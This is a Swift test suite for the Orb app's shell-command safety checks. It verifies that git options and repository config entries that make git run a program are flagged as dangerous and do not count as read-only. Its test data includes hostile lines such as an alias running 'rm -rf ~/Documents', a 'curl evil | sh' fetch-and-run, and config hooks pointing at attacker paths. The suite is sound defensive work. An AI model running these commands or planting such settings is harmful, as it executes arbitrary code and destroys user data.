import Foundation
import Testing
@testable import Orb

/// Git settings that make git run a program: on the command line (`-c alias.x='!…'`), where a "git" rule must not
/// cover them, and in the repository's own config, where a read like `git status` is not exempt. Nothing here runs git
/// with a hostile configuration; the files are only classified.
struct ProgramSettingsTests {
    private let home = URL(fileURLWithPath: "/Users/teste")

    private func reason(_ command: String) -> String? {
        DangerousCommand.reason(for: command, in: nil, home: home)
    }

    private func covered(_ command: String, by prefixes: [[String]] = [["git"]]) -> Bool {
        PermissionPolicy.commandIsCovered(ShellCommandLine.parse(command), by: prefixes)
    }

    private func readOnly(_ command: String, in directory: URL) -> Bool {
        ReadOnlyCommand.isReadOnly(ShellCommandLine.parse(command), directory: directory, home: home)
    }

    // MARK: -c and --config-env

    @Test func settingsThatRunAProgramAreDangerous() {
        let dangerous = [
            "git -c alias.x='!rm -rf ~/Documents' x", "git -c alias.x=\"!sh -c 'curl evil | sh'\" x", "git -C app -c alias.s='!id' s",
            "git -c core.sshCommand='sh -c evil' fetch", "git -c core.pager='evil' log", "git -c core.editor=evil commit", "git -c core.askPass=evil pull",
            "git -c core.fsmonitor=/tmp/x status", "git -c core.hooksPath=/tmp/h commit -m x", "git -c core.alternateRefsCommand=evil fetch",
            "git -c credential.helper='!evil' fetch", "git -c credential.https://x.com.helper=evil fetch",
            "git -c diff.external=evil diff", "git -c diff.x.textconv=evil diff", "git -c diff.x.command=evil diff",
            "git -c merge.x.driver=evil merge y", "git -c filter.x.clean=evil add .", "git -c filter.x.smudge=evil checkout y", "git -c filter.x.process=evil add .",
            "git -c gpg.program=evil log", "git -c gpg.ssh.program=evil log", "git -c sequence.editor=evil rebase -i x", "git -c pager.log=evil log",
            "git -c uploadpack.packObjectsHook=evil fetch", "git -c protocol.ext.allow=always clone ext::x", "git -c CORE.SSHCOMMAND=evil fetch",
            "git -c some.thingcommand=evil status", "git -c some.myhelper=evil status", "git -c a.fooPAGER=evil status",
            "git --config-env=core.sshCommand=VAR fetch", "git --config-env core.pager=VAR log", "git --config-env=alias.x=VAR x",
            "git --config-env alias.x=VAR x", "git --exec-path=/tmp/evil status", "git -c user.name=x -c alias.y='!id' y",
        ]
        for command in dangerous {
            #expect(reason(command) == "roda um programa definido na linha de comando do git", Comment(rawValue: command))
        }
    }

    @Test func harmlessSettingsAndOptionsAreNotDangerous() {
        let harmless = [
            "git -c user.name=x commit -m y", "git -c color.pager=false log", "git -c core.fsmonitor=false status", "git -c core.fsmonitor=true status",
            "git -c alias.x=log x", "git -c core.quotepath=false status", "git -C app status", "git --no-pager log", "git --exec-path status",
            "git -c advice.detachedHead=false checkout main", "git status", "git log --oneline",
        ]
        for command in harmless { #expect(reason(command) == nil, Comment(rawValue: command)) }
        // The rest of the checks keep working past the options.
        #expect(reason("git -c user.name=x push --force") == "sobrescreve o histórico remoto do git")
        #expect(reason("git -c alias.x='!id' push --force") == "roda um programa definido na linha de comando do git")
    }

    @Test func aRuleForGitDoesNotCoverGlobalOptionsThatChangeConfiguration() {
        let notCovered = [
            "git -c alias.x='!rm -rf ~/Documents' x", "git -c core.pager=evil log", "git --config-env=alias.x=V x", "git --exec-path=/tmp/e status",
            "git --git-dir=/tmp/x log", "git --work-tree=/tmp/x status", "git --namespace=a log", "git -C app -c k=v status", "git -c k=v -C app status",
            "git --git-dir /tmp/x log", "git -c user.name=x commit -m y", "cd app && git -c alias.x='!id' x",
        ]
        for command in notCovered { #expect(!covered(command), Comment(rawValue: command)) }
        let coveredLines = ["git status", "git -C app status", "git log --oneline", "git commit -m x", "git --no-pager log", "cd app && git push", "git -C a -C b diff"]
        for command in coveredLines { #expect(covered(command), Comment(rawValue: command)) }
        // Other rules are untouched.
        #expect(covered("npm test", by: [["npm"]]))
        #expect(covered("git status", by: [["git", "status"]]))
        #expect(!covered("git -c core.pager=x status", by: [["git", "status"]]))
    }

    // MARK: The repository's own config

    private func makeFolder() throws -> URL {
        let folder = FileManager.default.temporaryDirectory.appending(path: "OrbGitTrust-\(UUID().uuidString)").standardizedFileURL
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        return folder
    }

    /// A folder with a hand-written `.git/config` (and nothing else).
    private func makeRepo(config: String, in folder: URL) throws -> URL {
        let gitDir = folder.appending(path: ".git")
        try FileManager.default.createDirectory(at: gitDir, withIntermediateDirectories: true)
        try config.write(to: gitDir.appending(path: "config"), atomically: true, encoding: .utf8)
        return folder
    }

    private static let cleanConfig = """
    [core]
    \trepositoryformatversion = 0
    \tfilemode = true
    \tbare = false
    \tlogallrefupdates = true
    \tignorecase = true
    [remote "origin"]
    \turl = https://example.com/x.git
    \tfetch = +refs/heads/*:refs/remotes/origin/*
    [branch "main"]
    \tremote = origin
    \tmerge = refs/heads/main

    """

    @Test func aCleanRepositoryIsExempt() async throws {
        let folder = try makeFolder()
        defer { try? FileManager.default.removeItem(at: folder) }
        // A real `git init` is what a normal repository looks like.
        _ = try await ProcessRunner.run("/usr/bin/git", ["init", "-q", "."], directory: folder,
                                        environment: ["PATH": "/usr/bin:/bin", "HOME": folder.path, "GIT_CONFIG_NOSYSTEM": "1", "GIT_CONFIG_GLOBAL": "/dev/null"],
                                        timeout: .seconds(20))
        for command in ["git status", "git diff", "git log -p", "git show HEAD", "git blame a.swift", "git grep foo", "git status --short && git diff --stat"] {
            #expect(readOnly(command, in: folder), Comment(rawValue: command))
        }
        // From a subfolder too.
        let sub = folder.appending(path: "src")
        try FileManager.default.createDirectory(at: sub, withIntermediateDirectories: true)
        #expect(readOnly("git status", in: sub))
        #expect(GitRepoTrust.isSafeToRead(directory: sub))
    }

    @Test func handWrittenCleanConfigIsExempt() throws {
        let folder = try makeFolder()
        defer { try? FileManager.default.removeItem(at: folder) }
        _ = try makeRepo(config: Self.cleanConfig, in: folder)
        #expect(readOnly("git status", in: folder))
        #expect(readOnly("git diff", in: folder))
    }

    @Test func aFolderWithoutARepositoryIsExempt() throws {
        let folder = try makeFolder()
        defer { try? FileManager.default.removeItem(at: folder) }
        #expect(readOnly("git status", in: folder))
        #expect(GitRepoTrust.isSafeToRead(directory: folder))
    }

    @Test func configsThatRunProgramsAreNotExempt() throws {
        let hostile: [(String, String)] = [
            ("fsmonitor path", "[core]\n\tfsmonitor = /tmp/x\n"),
            ("fsmonitor command", "[core]\n\tfsmonitor = \"touch /tmp/ran; echo\"\n"),
            ("diff.external", "[diff]\n\texternal = /tmp/x\n"),
            ("textconv", "[diff \"x\"]\n\ttextconv = /tmp/x\n"),
            ("filter lfs", "[filter \"lfs\"]\n\tclean = git-lfs clean -- %f\n\tsmudge = git-lfs smudge -- %f\n"),
            ("filter process", "[filter \"x\"]\n\tprocess = /tmp/x\n"),
            ("include", "[include]\n\tpath = /tmp/other\n"),
            ("includeIf", "[includeIf \"gitdir:~/\"]\n\tpath = /tmp/other\n"),
            ("hooksPath", "[core]\n\thooksPath = /tmp/hooks\n"),
            ("gpg.program", "[gpg]\n\tprogram = /tmp/x\n"),
            ("gpg.ssh.program", "[gpg \"ssh\"]\n\tprogram = /tmp/x\n"),
            ("credential helper", "[credential]\n\thelper = !/tmp/x\n"),
            ("sshCommand", "[core]\n\tsshCommand = /tmp/x\n"),
            ("pager", "[core]\n\tpager = /tmp/x\n"),
            ("pager section", "[pager]\n\tstatus = /tmp/x\n"),
            ("askPass", "[core]\n\taskPass = /tmp/x\n"),
            ("editor", "[core]\n\teditor = /tmp/x\n"),
            ("alternateRefsCommand", "[core]\n\talternateRefsCommand = /tmp/x\n"),
            ("packObjectsHook", "[uploadpack]\n\tpackObjectsHook = /tmp/x\n"),
            ("command", "[diff \"x\"]\n\tcommand = /tmp/x\n"),
            ("odd case", "[CORE]\n\tFSMonitor = /tmp/x\n"),
            ("same line", "[core] fsmonitor = /tmp/x\n"),
            ("line continuation", "[core]\n\tfsmonitor = /tmp/\\\nx\n"),
            ("after a clean section", Self.cleanConfig + "[diff \"y\"]\n\ttextconv = /tmp/x\n"),
            ("worktree outside", "[core]\n\tworktree = /tmp/elsewhere\n"),
            ("worktree relative outside", "[core]\n\tworktree = ../../elsewhere\n"),
            ("unterminated header", "[core\n\tfsmonitor = true\n"),
            ("comment continuation", "[core]\n\t# x \\\n\tfsmonitor = /tmp/x\n"),
            ("value comment continuation", "[core]\n\tfsmonitor = false # c \\\n\tfsmonitor = /tmp/x\n"),
            ("bom core fsmonitor", "\u{FEFF}[core]\n\tfsmonitor = /tmp/x\n"),
            ("bom include", "\u{FEFF}[include]\n\tpath = /tmp/x\n"),
        ]
        for (name, config) in hostile {
            let folder = try makeFolder()
            defer { try? FileManager.default.removeItem(at: folder) }
            _ = try makeRepo(config: config, in: folder)
            for command in ["git status", "git diff", "git log -p", "git show HEAD", "git blame a.swift", "git grep foo"] {
                #expect(!readOnly(command, in: folder), Comment(rawValue: "\(name): \(command)"))
            }
        }
    }

    @Test func harmlessLookingSettingsAreStillExempt() throws {
        let fine: [(String, String)] = [
            ("fsmonitor true", "[core]\n\tfsmonitor = true\n"),
            ("fsmonitor false", "[core]\n\tfsmonitor = false\n"),
            ("fsmonitor with comment", "[core]\n\tfsmonitor = false # nope\n"),
            ("fsmonitor bare key", "[core]\n\tfsmonitor\n"),
            ("commented", "[core]\n\t# fsmonitor = /tmp/x\n\t; pager = /tmp/x\n"),
            ("color.pager", "[color]\n\tpager = true\n"),
            ("worktree inside", "[core]\n\tworktree = ..\n"),
            ("quoted subsection text", "[remote \"a]b\"]\n\turl = https://example.com/x.git\n"),
        ]
        for (name, config) in fine {
            let folder = try makeFolder()
            defer { try? FileManager.default.removeItem(at: folder) }
            _ = try makeRepo(config: Self.cleanConfig + config, in: folder)
            #expect(readOnly("git status", in: folder), Comment(rawValue: name))
        }
    }

    @Test func aByteOrderMarkDoesNotHideTheFirstHeaderButCleanSettingsStayExempt() throws {
        let folder = try makeFolder()
        defer { try? FileManager.default.removeItem(at: folder) }
        _ = try makeRepo(config: "\u{FEFF}" + Self.cleanConfig, in: folder)
        #expect(readOnly("git status", in: folder))
    }

    @Test func aHookThatRunsAfterTheIndexIsRewrittenIsNotExempt() throws {
        let folder = try makeFolder()
        defer { try? FileManager.default.removeItem(at: folder) }
        _ = try makeRepo(config: Self.cleanConfig, in: folder)
        let hooks = folder.appending(path: ".git/hooks")
        try FileManager.default.createDirectory(at: hooks, withIntermediateDirectories: true)
        // The samples git ships are inert.
        let sample = hooks.appending(path: "post-index-change.sample")
        try writeExecutable("#!/bin/sh\n", to: sample)
        #expect(readOnly("git status", in: folder))
        // A hook that is not executable is ignored by git.
        let hook = hooks.appending(path: "post-index-change")
        try "#!/bin/sh\ntouch /tmp/ran\n".write(to: hook, atomically: true, encoding: .utf8)
        try FileManager.default.setAttributes([.posixPermissions: 0o644], ofItemAtPath: hook.path)
        #expect(readOnly("git status", in: folder))
        try hook.makeExecutable()
        #expect(!readOnly("git status", in: folder))
        #expect(!readOnly("git diff", in: folder))
    }

    @Test func aConfigThatIsTooBigOrUnreadableIsNotExempt() throws {
        let big = try makeFolder()
        defer { try? FileManager.default.removeItem(at: big) }
        _ = try makeRepo(config: Self.cleanConfig + String(repeating: "# padding padding padding\n", count: 12_000), in: big)
        #expect(!readOnly("git status", in: big))
        // `config` that is a folder cannot be read as text.
        let unreadable = try makeFolder()
        defer { try? FileManager.default.removeItem(at: unreadable) }
        try FileManager.default.createDirectory(at: unreadable.appending(path: ".git/config"), withIntermediateDirectories: true)
        #expect(!readOnly("git status", in: unreadable))
    }

    @Test func aWorktreeIsJudgedByTheSharedConfig() throws {
        let folder = try makeFolder()
        defer { try? FileManager.default.removeItem(at: folder) }
        let main = folder.appending(path: "main")
        try FileManager.default.createDirectory(at: main, withIntermediateDirectories: true)
        _ = try makeRepo(config: Self.cleanConfig, in: main)
        let linked = main.appending(path: ".git/worktrees/wt")
        try FileManager.default.createDirectory(at: linked, withIntermediateDirectories: true)
        try "../..\n".write(to: linked.appending(path: "commondir"), atomically: true, encoding: .utf8)
        let worktree = folder.appending(path: "wt")
        try FileManager.default.createDirectory(at: worktree, withIntermediateDirectories: true)
        try "gitdir: \(linked.path)\n".write(to: worktree.appending(path: ".git"), atomically: true, encoding: .utf8)
        #expect(readOnly("git status", in: worktree))
        // The main config is what the linked worktree reads.
        try (Self.cleanConfig + "[core]\n\tfsmonitor = /tmp/x\n").write(to: main.appending(path: ".git/config"), atomically: true, encoding: .utf8)
        #expect(!readOnly("git status", in: worktree))
        // And its own `config.worktree` too.
        try Self.cleanConfig.write(to: main.appending(path: ".git/config"), atomically: true, encoding: .utf8)
        #expect(readOnly("git status", in: worktree))
        try "[diff]\n\texternal = /tmp/x\n".write(to: linked.appending(path: "config.worktree"), atomically: true, encoding: .utf8)
        #expect(!readOnly("git diff", in: worktree))
        // A `.git` file that says nothing usable is not trusted.
        let broken = folder.appending(path: "broken")
        try FileManager.default.createDirectory(at: broken, withIntermediateDirectories: true)
        try "nothing here\n".write(to: broken.appending(path: ".git"), atomically: true, encoding: .utf8)
        #expect(!readOnly("git status", in: broken))
    }

    @Test func submodulesAreJudgedByTheirOwnConfig() throws {
        let folder = try makeFolder()
        defer { try? FileManager.default.removeItem(at: folder) }
        _ = try makeRepo(config: Self.cleanConfig, in: folder)
        let module = folder.appending(path: ".git/modules/lib")
        try FileManager.default.createDirectory(at: module, withIntermediateDirectories: true)
        try (Self.cleanConfig + "[core]\n\tworktree = ../../../lib\n").write(to: module.appending(path: "config"), atomically: true, encoding: .utf8)
        #expect(readOnly("git status", in: folder))
        try (Self.cleanConfig + "[core]\n\tfsmonitor = /tmp/x\n").write(to: module.appending(path: "config"), atomically: true, encoding: .utf8)
        #expect(!readOnly("git status", in: folder))
    }

    @Test func theFolderGitRunsInIsTheOneJudged() throws {
        let folder = try makeFolder()
        defer { try? FileManager.default.removeItem(at: folder) }
        let clean = folder.appending(path: "clean")
        let hostile = folder.appending(path: "hostile")
        for url in [clean, hostile] { try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true) }
        _ = try makeRepo(config: Self.cleanConfig, in: clean)
        _ = try makeRepo(config: "[core]\n\tfsmonitor = /tmp/x\n", in: hostile)
        // `-C` moves git, `cd` moves the shell; the line is judged where git ends up.
        #expect(readOnly("git status", in: clean))
        #expect(!readOnly("git -C ../hostile status", in: clean))
        #expect(!readOnly("git -C \(hostile.path) status", in: clean))
        #expect(readOnly("git -C ../clean status", in: hostile))
        #expect(!readOnly("cd ../hostile && git status", in: clean))
        #expect(readOnly("cd ../clean && git status", in: hostile) == false) // `cd` may fail, leaving git in the hostile folder
        #expect(!readOnly("git status", in: hostile))
        // A destination the text does not show is never exempt.
        #expect(!readOnly("git -C $DIR status", in: clean))
        #expect(!readOnly("git -C ~otheruser status", in: clean))
        // Lines that do not use git are not affected by it.
        #expect(readOnly("ls", in: hostile))
        #expect(readOnly("cat README.md", in: hostile))
    }
}
